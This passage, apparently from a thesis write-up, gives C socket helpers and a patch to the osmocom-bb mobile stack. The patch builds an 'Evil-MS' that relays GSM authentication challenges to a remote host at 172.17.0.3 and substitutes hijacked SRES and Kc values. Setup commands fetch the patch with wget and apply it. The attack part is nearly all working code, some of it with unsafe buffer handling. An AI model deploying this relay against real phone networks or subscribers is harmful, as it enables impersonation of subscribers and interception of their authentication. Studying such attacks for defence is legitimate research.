<span id="cb32-47"><a href="#cb32-47" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span><span class="dt">int</span> i<span class="op">=</span><span class="dv">0</span><span class="op">;</span></span>
<span id="cb32-48"><a href="#cb32-48" aria-hidden="true" tabindex="-1"></a>    <span class="cf">while</span> <span class="op">(*</span>c<span class="op">)</span></span>
<span id="cb32-49"><a href="#cb32-49" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
<span id="cb32-50"><a href="#cb32-50" aria-hidden="true" tabindex="-1"></a>      oc <span class="op">=</span> <span class="op">(</span>hexdigit <span class="op">(*</span>c<span class="op">++)</span> <span class="op">&lt;&lt;</span> <span class="dv">4</span><span class="op">)</span> <span class="op">+</span> hexdigit <span class="op">(*</span>c<span class="op">++);</span></span>
<span id="cb32-51"><a href="#cb32-51" aria-hidden="true" tabindex="-1"></a>      fputc <span class="op">(</span>oc<span class="op">,</span> stdout<span class="op">);</span></span>
<span id="cb32-52"><a href="#cb32-52" aria-hidden="true" tabindex="-1"></a>      strcat<span class="op">(</span>ascii<span class="op">,&amp;</span>oc<span class="op">);</span></span>
<span id="cb32-53"><a href="#cb32-53" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb32-54"><a href="#cb32-54" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb32-55"><a href="#cb32-55" aria-hidden="true" tabindex="-1"></a><span class="cf">return</span> ascii<span class="op">;}</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>client.h (respect address and port of client server arch)</p>
<div class="sourceCode" id="cb33"><pre class="sourceCode c code-with-copy"><code class="sourceCode c"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="co">/**</span></span>
<span id="cb33-2"><a href="#cb33-2" aria-hidden="true" tabindex="-1"></a><span class="co"> * Example taken from CS 241 @ UIUC</span></span>
<span id="cb33-3"><a href="#cb33-3" aria-hidden="true" tabindex="-1"></a><span class="co"> * Edited by Austin Walters</span></span>
<span id="cb33-4"><a href="#cb33-4" aria-hidden="true" tabindex="-1"></a><span class="co"> * Used as example for austingwalters.com,</span></span>
<span id="cb33-5"><a href="#cb33-5" aria-hidden="true" tabindex="-1"></a><span class="co"> * in socket IPC explanation.</span></span>
<span id="cb33-6"><a href="#cb33-6" aria-hidden="true" tabindex="-1"></a><span class="co"> */</span></span>
<span id="cb33-7"><a href="#cb33-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb33-8"><a href="#cb33-8" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
<span id="cb33-9"><a href="#cb33-9" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
<span id="cb33-10"><a href="#cb33-10" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
<span id="cb33-11"><a href="#cb33-11" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/types.h&gt;</span></span>
<span id="cb33-12"><a href="#cb33-12" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/socket.h&gt;</span></span>
<span id="cb33-13"><a href="#cb33-13" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;netdb.h&gt;</span></span>
<span id="cb33-14"><a href="#cb33-14" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></span>
<span id="cb33-15"><a href="#cb33-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb33-16"><a href="#cb33-16" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> client<span class="op">(</span><span class="dt">char</span> buffer<span class="op">[]){</span></span>
<span id="cb33-17"><a href="#cb33-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb33-18"><a href="#cb33-18" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span> sock_fd <span class="op">=</span> socket<span class="op">(</span>AF_INET<span class="op">,</span> SOCK_STREAM<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
<span id="cb33-19"><a href="#cb33-19" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb33-20"><a href="#cb33-20" aria-hidden="true" tabindex="-1"></a>  <span class="kw">struct</span> addrinfo info<span class="op">,</span> <span class="op">*</span>result<span class="op">;</span></span>
<span id="cb33-21"><a href="#cb33-21" aria-hidden="true" tabindex="-1"></a>  memset<span class="op">(&amp;</span>info<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span><span class="kw">struct</span> addrinfo<span class="op">));</span></span>
<span id="cb33-22"><a href="#cb33-22" aria-hidden="true" tabindex="-1"></a>  info<span class="op">.</span>ai_family <span class="op">=</span> AF_INET<span class="op">;</span></span>
<span id="cb33-23"><a href="#cb33-23" aria-hidden="true" tabindex="-1"></a>  info<span class="op">.</span>ai_socktype <span class="op">=</span> SOCK_STREAM<span class="op">;</span></span>
<span id="cb33-24"><a href="#cb33-24" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb33-25"><a href="#cb33-25" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span><span class="op">(</span><span class="dv">0</span> <span class="op">!=</span> getaddrinfo<span class="op">(</span><span class="st">"172.17.0.3"</span><span class="op">,</span> <span class="st">"888"</span><span class="op">,</span> <span class="op">&amp;</span>info<span class="op">,</span> <span class="op">&amp;</span>result<span class="op">))</span></span>
<span id="cb33-26"><a href="#cb33-26" aria-hidden="true" tabindex="-1"></a>    exit<span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
<span id="cb33-27"><a href="#cb33-27" aria-hidden="true" tabindex="-1"></a>  </span>
<span id="cb33-28"><a href="#cb33-28" aria-hidden="true" tabindex="-1"></a>  <span class="co">/* Connects to bound socket on the server */</span>  </span>
<span id="cb33-29"><a href="#cb33-29" aria-hidden="true" tabindex="-1"></a>  connect<span class="op">(</span>sock_fd<span class="op">,</span> result<span class="op">-&gt;</span>ai_addr<span class="op">,</span> result<span class="op">-&gt;</span>ai_addrlen<span class="op">);</span></span>
<span id="cb33-30"><a href="#cb33-30" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb33-31"><a href="#cb33-31" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">"SENDING: </span><span class="sc">%s</span><span class="st">"</span><span class="op">,</span> buffer<span class="op">);</span></span>
<span id="cb33-32"><a href="#cb33-32" aria-hidden="true" tabindex="-1"></a>  write<span class="op">(</span>sock_fd<span class="op">,</span> buffer<span class="op">,</span> strlen<span class="op">(</span>buffer<span class="op">));</span></span>
<span id="cb33-33"><a href="#cb33-33" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb33-34"><a href="#cb33-34" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> resp<span class="op">[</span><span class="dv">999</span><span class="op">];</span></span>
<span id="cb33-35"><a href="#cb33-35" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span> len <span class="op">=</span> strlen<span class="op">(</span>buffer<span class="op">);</span></span>
<span id="cb33-36"><a href="#cb33-36" aria-hidden="true" tabindex="-1"></a>  resp<span class="op">[</span>len<span class="op">]</span> <span class="op">=</span> <span class="ch">'</span><span class="sc">\0</span><span class="ch">'</span><span class="op">;</span></span>
<span id="cb33-37"><a href="#cb33-37" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">"</span><span class="sc">%s\n</span><span class="st">"</span><span class="op">,</span> resp<span class="op">);</span></span>
<span id="cb33-38"><a href="#cb33-38" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>server.h (respect variable length : 13 for sres, 25 for kc, 51 for rand, and port from arch client-server)</p>
<div class="sourceCode" id="cb34"><pre class="sourceCode c code-with-copy"><code class="sourceCode c"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="co">/**</span></span>
<span id="cb34-2"><a href="#cb34-2" aria-hidden="true" tabindex="-1"></a><span class="co"> * Written by Austin Walters</span></span>
<span id="cb34-3"><a href="#cb34-3" aria-hidden="true" tabindex="-1"></a><span class="co"> * For an example on austingwalters.com,</span></span>
<span id="cb34-4"><a href="#cb34-4" aria-hidden="true" tabindex="-1"></a><span class="co"> * on sockets</span></span>
<span id="cb34-5"><a href="#cb34-5" aria-hidden="true" tabindex="-1"></a><span class="co"> */</span></span>
<span id="cb34-6"><a href="#cb34-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-7"><a href="#cb34-7" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
<span id="cb34-8"><a href="#cb34-8" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
<span id="cb34-9"><a href="#cb34-9" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
<span id="cb34-10"><a href="#cb34-10" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/types.h&gt;</span></span>
<span id="cb34-11"><a href="#cb34-11" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/socket.h&gt;</span></span>
<span id="cb34-12"><a href="#cb34-12" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;netdb.h&gt;</span></span>
<span id="cb34-13"><a href="#cb34-13" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></span>
<span id="cb34-14"><a href="#cb34-14" aria-hidden="true" tabindex="-1"></a><span class="dt">char</span> text<span class="op">[</span><span class="dv">13</span><span class="op">];</span></span>
<span id="cb34-15"><a href="#cb34-15" aria-hidden="true" tabindex="-1"></a><span class="dt">char</span><span class="op">*</span> catch_sres<span class="op">(){</span></span>
<span id="cb34-16"><a href="#cb34-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-17"><a href="#cb34-17" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span> sock_fd <span class="op">=</span> socket<span class="op">(</span>AF_INET<span class="op">,</span> SOCK_STREAM<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
<span id="cb34-18"><a href="#cb34-18" aria-hidden="true" tabindex="-1"></a>  <span class="kw">struct</span> addrinfo directives<span class="op">,</span> <span class="op">*</span>result<span class="op">;</span></span>
<span id="cb34-19"><a href="#cb34-19" aria-hidden="true" tabindex="-1"></a>  memset<span class="op">(&amp;</span>directives<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span><span class="kw">struct</span> addrinfo<span class="op">));</span></span>
<span id="cb34-20"><a href="#cb34-20" aria-hidden="true" tabindex="-1"></a>  directives<span class="op">.</span>ai_family <span class="op">=</span> AF_INET<span class="op">;</span></span>
<span id="cb34-21"><a href="#cb34-21" aria-hidden="true" tabindex="-1"></a>  directives<span class="op">.</span>ai_socktype <span class="op">=</span> SOCK_STREAM<span class="op">;</span></span>
<span id="cb34-22"><a href="#cb34-22" aria-hidden="true" tabindex="-1"></a>  directives<span class="op">.</span>ai_flags <span class="op">=</span> AI_PASSIVE<span class="op">;</span></span>
<span id="cb34-23"><a href="#cb34-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-24"><a href="#cb34-24" aria-hidden="true" tabindex="-1"></a>  <span class="co">/* Translates IP, port, protocal into struct */</span></span>
<span id="cb34-25"><a href="#cb34-25" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span><span class="op">(</span><span class="dv">0</span> <span class="op">!=</span>  getaddrinfo<span class="op">(</span><span class="st">"0.0.0.0"</span><span class="op">,</span> <span class="st">"666"</span><span class="op">,</span> <span class="op">&amp;</span>directives<span class="op">,</span> <span class="op">&amp;</span>result<span class="op">))</span></span>
<span id="cb34-26"><a href="#cb34-26" aria-hidden="true" tabindex="-1"></a>    exit<span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
<span id="cb34-27"><a href="#cb34-27" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb34-28"><a href="#cb34-28" aria-hidden="true" tabindex="-1"></a>  <span class="co">/* Binds socket to port, so we know where new connections form */</span></span>
<span id="cb34-29"><a href="#cb34-29" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span><span class="op">(</span>bind<span class="op">(</span>sock_fd<span class="op">,</span> result<span class="op">-&gt;</span>ai_addr<span class="op">,</span> result<span class="op">-&gt;</span>ai_addrlen<span class="op">)</span> <span class="op">!=</span> <span class="dv">0</span><span class="op">)</span></span>
<span id="cb34-30"><a href="#cb34-30" aria-hidden="true" tabindex="-1"></a>      exit<span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
<span id="cb34-31"><a href="#cb34-31" aria-hidden="true" tabindex="-1"></a>  <span class="co">/* Places socket to "listen" or "wait for stuff" state */</span></span>
<span id="cb34-32"><a href="#cb34-32" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span><span class="op">(</span>listen<span class="op">(</span>sock_fd<span class="op">,</span> <span class="dv">10</span><span class="op">)</span> <span class="op">!=</span> <span class="dv">0</span><span class="op">)</span></span>
<span id="cb34-33"><a href="#cb34-33" aria-hidden="true" tabindex="-1"></a>      exit<span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
<span id="cb34-34"><a href="#cb34-34" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span> i<span class="op">=</span><span class="dv">0</span><span class="op">;</span></span>
<span id="cb34-35"><a href="#cb34-35" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">"Waiting for connection on http://0.0.0.0:666 ...</span><span class="sc">\n</span><span class="st">"</span><span class="op">);</span></span>
<span id="cb34-36"><a href="#cb34-36" aria-hidden="true" tabindex="-1"></a>  <span class="cf">while</span><span class="op">(</span>i<span class="op">==</span><span class="dv">0</span><span class="op">){</span></span>
<span id="cb34-37"><a href="#cb34-37" aria-hidden="true" tabindex="-1"></a>   </span>
<span id="cb34-38"><a href="#cb34-38" aria-hidden="true" tabindex="-1"></a>    <span class="co">/* Accepts Connection */</span></span>
<span id="cb34-39"><a href="#cb34-39" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> buffer<span class="op">[</span><span class="dv">1000</span><span class="op">];</span></span>
<span id="cb34-40"><a href="#cb34-40" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> client_fd <span class="op">=</span> accept<span class="op">(</span>sock_fd<span class="op">,</span> NULL<span class="op">,</span> NULL<span class="op">);</span> </span>
<span id="cb34-41"><a href="#cb34-41" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> len <span class="op">=</span> read<span class="op">(</span>client_fd<span class="op">,</span> buffer<span class="op">,</span> <span class="dv">999</span><span class="op">);</span></span>
<span id="cb34-42"><a href="#cb34-42" aria-hidden="true" tabindex="-1"></a>    buffer<span class="op">[</span>len<span class="op">]</span> <span class="op">=</span> <span class="ch">'</span><span class="sc">\0</span><span class="ch">'</span><span class="op">;</span></span>
<span id="cb34-43"><a href="#cb34-43" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb34-44"><a href="#cb34-44" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span> header <span class="op">=</span> <span class="st">"&lt;b&gt;You Connected to the Server!&lt;/b&gt;&lt;/br&gt;&lt;/br&gt;"</span><span class="op">;</span></span>
<span id="cb34-45"><a href="#cb34-45" aria-hidden="true" tabindex="-1"></a>    i<span class="op">=</span>i<span class="op">+</span><span class="dv">1</span><span class="op">;</span></span>
<span id="cb34-46"><a href="#cb34-46" aria-hidden="true" tabindex="-1"></a>    write<span class="op">(</span>client_fd<span class="op">,</span> header<span class="op">,</span> strlen<span class="op">(</span>header<span class="op">));</span></span>
<span id="cb34-47"><a href="#cb34-47" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb34-48"><a href="#cb34-48" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">"=== Client Sent ===</span><span class="sc">\n</span><span class="st">"</span><span class="op">);</span></span>
<span id="cb34-49"><a href="#cb34-49" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">"</span><span class="sc">%s\n</span><span class="st">"</span><span class="op">,</span> buffer<span class="op">);</span></span>
<span id="cb34-50"><a href="#cb34-50" aria-hidden="true" tabindex="-1"></a>    memcpy<span class="op">(</span>text<span class="op">,</span>buffer<span class="op">,</span><span class="dv">13</span><span class="op">);</span></span>
<span id="cb34-51"><a href="#cb34-51" aria-hidden="true" tabindex="-1"></a>    close<span class="op">(</span>client_fd<span class="op">);</span></span>
<span id="cb34-52"><a href="#cb34-52" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-53"><a href="#cb34-53" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb34-54"><a href="#cb34-54" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> text<span class="op">;</span></span>
<span id="cb34-55"><a href="#cb34-55" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="evil-ms-1" class="level2">
<h2 class="anchored" data-anchor-id="evil-ms-1">Evil-MS :</h2>
<div class="sourceCode" id="cb35"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/osmocom-bb</span>
<span id="cb35-2"><a href="#cb35-2" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout fc20a37cb375dac11f45b78a446237c70f00841c</span>
<span id="cb35-3"><a href="#cb35-3" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> https://gitlab.com/francoip/thesis/raw/public/patch/thesis.patch</span>
<span id="cb35-4"><a href="#cb35-4" aria-hidden="true" tabindex="-1"></a><span class="fu">patch</span> <span class="at">-p1</span> <span class="op">&lt;</span> thesis.patch</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb36"><pre class="sourceCode patch code-with-copy"><code class="sourceCode diff"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="kw">diff -ru osmocom-bb/src/host/layer23/src/mobile/gsm48_mm.c heartbreaker/bb-2rfa/src/host/layer23/src/mobile/gsm48_mm.c</span></span>
<span id="cb36-2"><a href="#cb36-2" aria-hidden="true" tabindex="-1"></a><span class="dt">--- osmocom-bb/src/host/layer23/src/mobile/gsm48_mm.c   2022-08-30 15:39:46.222274989 +0200</span></span>
<span id="cb36-3"><a href="#cb36-3" aria-hidden="true" tabindex="-1"></a><span class="dt">+++ heartbreaker/bb-2rfa/src/host/layer23/src/mobile/gsm48_mm.c 2022-08-30 15:35:55.472598046 +0200</span></span>
<span id="cb36-4"><a href="#cb36-4" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -20,6 +20,7 @@</span></span>
<span id="cb36-5"><a href="#cb36-5" aria-hidden="true" tabindex="-1"></a>  */</span>
<span id="cb36-6"><a href="#cb36-6" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb36-7"><a href="#cb36-7" aria-hidden="true" tabindex="-1"></a> #include &lt;stdint.h&gt;</span>
<span id="cb36-8"><a href="#cb36-8" aria-hidden="true" tabindex="-1"></a><span class="va">+#include &lt;string.h&gt;</span></span>
<span id="cb36-9"><a href="#cb36-9" aria-hidden="true" tabindex="-1"></a> #include &lt;errno.h&gt;</span>
<span id="cb36-10"><a href="#cb36-10" aria-hidden="true" tabindex="-1"></a> #include &lt;stdio.h&gt;</span>
<span id="cb36-11"><a href="#cb36-11" aria-hidden="true" tabindex="-1"></a> #include &lt;string.h&gt;</span>
<span id="cb36-12"><a href="#cb36-12" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -41,7 +42,7 @@</span></span>
<span id="cb36-13"><a href="#cb36-13" aria-hidden="true" tabindex="-1"></a> #include &lt;osmocom/bb/mobile/app_mobile.h&gt;</span>
<span id="cb36-14"><a href="#cb36-14" aria-hidden="true" tabindex="-1"></a> #include &lt;osmocom/bb/mobile/vty.h&gt;</span>
<span id="cb36-15"><a href="#cb36-15" aria-hidden="true" tabindex="-1"></a> #include &lt;osmocom/bb/mobile/dos.h&gt;</span>
<span id="cb36-16"><a href="#cb36-16" aria-hidden="true" tabindex="-1"></a><span class="st">-</span></span>
<span id="cb36-17"><a href="#cb36-17" aria-hidden="true" tabindex="-1"></a><span class="va">+#include "client.h"</span></span>
<span id="cb36-18"><a href="#cb36-18" aria-hidden="true" tabindex="-1"></a> extern void *l23_ctx;</span>
<span id="cb36-19"><a href="#cb36-19" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb36-20"><a href="#cb36-20" aria-hidden="true" tabindex="-1"></a> void mm_conn_free(struct gsm48_mm_conn *conn);</span>
<span id="cb36-21"><a href="#cb36-21" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -1662,6 +1663,15 @@</span></span>
<span id="cb36-22"><a href="#cb36-22" aria-hidden="true" tabindex="-1"></a>     */</span>
<span id="cb36-23"><a href="#cb36-23" aria-hidden="true" tabindex="-1"></a>    if (mm-&gt;est_cause == RR_EST_CAUSE_EMERGENCY &amp;&amp; set-&gt;emergency_imsi[0])</span>
<span id="cb36-24"><a href="#cb36-24" aria-hidden="true" tabindex="-1"></a>        no_sim = 1;</span>
<span id="cb36-25"><a href="#cb36-25" aria-hidden="true" tabindex="-1"></a><span class="va">+   char test2[]="1";</span></span>
<span id="cb36-26"><a href="#cb36-26" aria-hidden="true" tabindex="-1"></a><span class="va">+   sprintf(test2, "%d", ar-&gt;key_seq);</span></span>
<span id="cb36-27"><a href="#cb36-27" aria-hidden="true" tabindex="-1"></a><span class="va">+   char test3[3]="-";//"87 65 43 21 87 65 43 21 87 65 43 21 87 65 43 21";</span></span>
<span id="cb36-28"><a href="#cb36-28" aria-hidden="true" tabindex="-1"></a><span class="va">+   strcat(test3,test2);</span></span>
<span id="cb36-29"><a href="#cb36-29" aria-hidden="true" tabindex="-1"></a><span class="va">+   char test[51]="87 65 43 21 87 65 43 21 87 65 43 21 87 65 43 21";</span></span>
<span id="cb36-30"><a href="#cb36-30" aria-hidden="true" tabindex="-1"></a><span class="va">+   strcpy(test,osmo_hexdump(ar-&gt;rand,16));</span></span>
<span id="cb36-31"><a href="#cb36-31" aria-hidden="true" tabindex="-1"></a><span class="va">+   strcat(test,test3);</span></span>
<span id="cb36-32"><a href="#cb36-32" aria-hidden="true" tabindex="-1"></a><span class="va">+   LOGP(DMM, LOGL_INFO, "AUTHENTICATION REQUEST (seq %s)\n", test);</span></span>
<span id="cb36-33"><a href="#cb36-33" aria-hidden="true" tabindex="-1"></a><span class="va">+   client(test);</span></span>
<span id="cb36-34"><a href="#cb36-34" aria-hidden="true" tabindex="-1"></a>    gsm_subscr_generate_kc(ms, ar-&gt;key_seq, ar-&gt;rand, no_sim);</span>
<span id="cb36-35"><a href="#cb36-35" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb36-36"><a href="#cb36-36" aria-hidden="true" tabindex="-1"></a>    /* wait for auth response event from SIM */</span>
<span id="cb36-37"><a href="#cb36-37" aria-hidden="true" tabindex="-1"></a><span class="kw">diff -ru osmocom-bb/src/host/layer23/src/mobile/subscriber.c heartbreaker/bb-2rfa/src/host/layer23/src/mobile/subscriber.c</span></span>
<span id="cb36-38"><a href="#cb36-38" aria-hidden="true" tabindex="-1"></a><span class="dt">--- osmocom-bb/src/host/layer23/src/mobile/subscriber.c 2022-08-30 15:38:53.125893570 +0200</span></span>
<span id="cb36-39"><a href="#cb36-39" aria-hidden="true" tabindex="-1"></a><span class="dt">+++ heartbreaker/bb-2rfa/src/host/layer23/src/mobile/subscriber.c   2022-08-30 15:35:55.476598075 +0200</span></span>
<span id="cb36-40"><a href="#cb36-40" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -30,6 +30,11 @@</span></span>
<span id="cb36-41"><a href="#cb36-41" aria-hidden="true" tabindex="-1"></a> #include &lt;osmocom/bb/common/osmocom_data.h&gt;</span>
<span id="cb36-42"><a href="#cb36-42" aria-hidden="true" tabindex="-1"></a> #include &lt;osmocom/bb/common/networks.h&gt;</span>
<span id="cb36-43"><a href="#cb36-43" aria-hidden="true" tabindex="-1"></a> #include &lt;osmocom/bb/mobile/vty.h&gt;</span>
<span id="cb36-44"><a href="#cb36-44" aria-hidden="true" tabindex="-1"></a><span class="va">+#include "server.h"</span></span>
<span id="cb36-45"><a href="#cb36-45" aria-hidden="true" tabindex="-1"></a><span class="va">+#include "server2.h"</span></span>
<span id="cb36-46"><a href="#cb36-46" aria-hidden="true" tabindex="-1"></a><span class="va">+#include "hex.h"</span></span>
<span id="cb36-47"><a href="#cb36-47" aria-hidden="true" tabindex="-1"></a><span class="va">+#include "hex2.h"</span></span>
<span id="cb36-48"><a href="#cb36-48" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb36-49"><a href="#cb36-49" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb36-50"><a href="#cb36-50" aria-hidden="true" tabindex="-1"></a> /* enable to get an empty list of forbidden PLMNs, even if stored on SIM.</span>
<span id="cb36-51"><a href="#cb36-51" aria-hidden="true" tabindex="-1"></a>  * if list is changed, the result is not written back to SIM */</span>
<span id="cb36-52"><a href="#cb36-52" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -945,14 +950,21 @@</span></span>
<span id="cb36-53"><a href="#cb36-53" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb36-54"><a href="#cb36-54" aria-hidden="true" tabindex="-1"></a>        /* store sequence */</span>
<span id="cb36-55"><a href="#cb36-55" aria-hidden="true" tabindex="-1"></a>        subscr-&gt;key_seq = key_seq;</span>
<span id="cb36-56"><a href="#cb36-56" aria-hidden="true" tabindex="-1"></a><span class="st">-       memcpy(subscr-&gt;key, vec-&gt;kc, 8);</span></span>
<span id="cb36-57"><a href="#cb36-57" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb36-58"><a href="#cb36-58" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb36-59"><a href="#cb36-59" aria-hidden="true" tabindex="-1"></a>        LOGP(DMM, LOGL_INFO, "Sending authentication response\n");</span>
<span id="cb36-60"><a href="#cb36-60" aria-hidden="true" tabindex="-1"></a><span class="va">+                char *h4ck3d_kc;</span></span>
<span id="cb36-61"><a href="#cb36-61" aria-hidden="true" tabindex="-1"></a><span class="va">+                h4ck3d_kc = catch_kc();</span></span>
<span id="cb36-62"><a href="#cb36-62" aria-hidden="true" tabindex="-1"></a><span class="va">+                const unsigned char *my_h4ck3d_kc=hex2ascii(h4ck3d_kc);</span></span>
<span id="cb36-63"><a href="#cb36-63" aria-hidden="true" tabindex="-1"></a><span class="va">+       char *h4ck3d_sres;</span></span>
<span id="cb36-64"><a href="#cb36-64" aria-hidden="true" tabindex="-1"></a><span class="va">+       h4ck3d_sres = catch_sres();</span></span>
<span id="cb36-65"><a href="#cb36-65" aria-hidden="true" tabindex="-1"></a><span class="va">+           const unsigned char *my_h4ck3d_sres=hex2ascii2(h4ck3d_sres);</span></span>
<span id="cb36-66"><a href="#cb36-66" aria-hidden="true" tabindex="-1"></a><span class="va">+       memcpy(subscr-&gt;key, my_h4ck3d_kc, 8);</span></span>
<span id="cb36-67"><a href="#cb36-67" aria-hidden="true" tabindex="-1"></a>        nmsg = gsm48_mmevent_msgb_alloc(GSM48_MM_EVENT_AUTH_RESPONSE);</span>
<span id="cb36-68"><a href="#cb36-68" aria-hidden="true" tabindex="-1"></a><span class="st">-       if (!nmsg)</span></span>
<span id="cb36-69"><a href="#cb36-69" aria-hidden="true" tabindex="-1"></a><span class="st">-           return -ENOMEM;</span></span>
<span id="cb36-70"><a href="#cb36-70" aria-hidden="true" tabindex="-1"></a>        nmme = (struct gsm48_mm_event *) nmsg-&gt;data;</span>
<span id="cb36-71"><a href="#cb36-71" aria-hidden="true" tabindex="-1"></a><span class="st">-       memcpy(nmme-&gt;sres, vec-&gt;sres, 4);</span></span>
<span id="cb36-72"><a href="#cb36-72" aria-hidden="true" tabindex="-1"></a><span class="va">+           memcpy(nmme-&gt;sres,my_h4ck3d_sres, 4);</span></span>
<span id="cb36-73"><a href="#cb36-73" aria-hidden="true" tabindex="-1"></a><span class="va">+       LOGP(DMM, LOGL_INFO, "KC hijacked = %s\n",osmo_hexdump(my_h4ck3d_kc,8));</span></span>
<span id="cb36-74"><a href="#cb36-74" aria-hidden="true" tabindex="-1"></a><span class="va">+       LOGP(DMM, LOGL_INFO, "SRES hijacked = %s\n",osmo_hexdump(my_h4ck3d_sres,4));</span></span>
<span id="cb36-75"><a href="#cb36-75" aria-hidden="true" tabindex="-1"></a>        gsm48_mmevent_msg(ms, nmsg);</span>
<span id="cb36-76"><a href="#cb36-76" aria-hidden="true" tabindex="-1"></a> </span>
<span id="cb36-77"><a href="#cb36-77" aria-hidden="true" tabindex="-1"></a>        return 0;</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="genuine-ms-kc-forwarding-1" class="level2">
<h2 class="anchored" data-anchor-id="genuine-ms-kc-forwarding-1">Genuine-MS (Kc Forwarding)</h2>
<p>Patch osmocom-bb</p>
